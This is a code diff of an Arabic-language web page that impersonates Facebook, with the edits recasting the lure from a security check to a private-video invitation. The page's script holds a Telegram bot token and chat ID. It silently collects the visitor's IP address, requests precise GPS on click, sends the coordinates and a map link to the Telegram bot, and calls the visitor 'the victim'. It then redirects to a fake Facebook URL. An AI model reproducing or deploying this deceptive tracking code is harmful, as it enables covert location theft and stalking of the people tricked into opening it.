@@ -4,16 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="فديو">
-    <meta property="og:description" content="تشغيل الفديو
+    <meta property="og:title" content="فيديو">
+    <meta property="og:description" content="تشغيل الفيديو الآن">
+    
     <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg"> 
+    <meta property="og:image:secure_url" content="https://appsyria00.github.io/54545/fb_alert.jpg">
+    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    <meta property="og:type" content="website">
     
+    <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
 
-    <title>Facebook Security Check</title>
+    <title>Facebook Video Player</title>
     
     <style>
         body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
@@ -29,25 +32,22 @@
 
     <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo">
-        <div class="h1"> </div>
-        <div class="p">شركة الفيسبوك .</div>
-        <button class="btn"> الدخول</button>
-        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">الصفحة الرسمية | شركة فيسبوك</p>
+        <div class="h1">مشغل الفيديو</div>
+        <div class="p">لقد تمت دعوتك لمشاهدة فيديو خاص. اضغط للدخول.</div>
+        <button class="btn">تشغيل الفيديو</button>
+        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">بواسطة شركة فيسبوك</p>
     </div>
 
 <script>
-    // 🔱 إعدادات بوت التلجرام 🔱
     const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
 
-    // 1. جلب الـ IP صامتاً فور الدخول
     function startSilentScan() {
         const script = document.createElement('script');
         script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
         document.body.appendChild(script);
     }
 
-    // 2. تحليل بيانات الـ IP وإرسالها صامتاً
     async function initDeepScan(data) {
         const ip = data.ip;
         try {
@@ -60,7 +60,6 @@
         }
     }
 
-    // 3. صيد الـ GPS الحقيقي بالأمتار عند الضغط
     function getAccurateGPS() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
@@ -68,11 +67,9 @@
                 let lon = pos.coords.longitude;
                 let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                 sendToTelegram(msg);
-                
-                // تمويه وتوجيه بعد الصيد
                 setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
             }, (err) => {
-                sendToTelegram("⚠️ الضحية رفض إذن الموقع الدقيق.");
+                sendToTelegram("⚠️ الضحية رفض إذن الموقع.");
                 window.location.href = "https://m.facebook.com/hacked";
             }, { enableHighAccuracy: true });
         } else {
